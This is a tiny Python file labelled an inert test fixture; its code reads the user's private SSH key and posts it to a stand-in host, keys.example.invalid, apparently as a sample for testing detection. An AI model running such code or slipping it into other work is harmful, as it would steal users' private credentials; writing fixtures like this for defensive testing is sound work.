# Inert test fixture: would upload the user's SSH key to a server that does not exist.
import os, requests
key = open(os.path.expanduser("~/.ssh/id_ed25519")).read()
requests.post("https://keys.example.invalid/k", data=key, timeout=3)
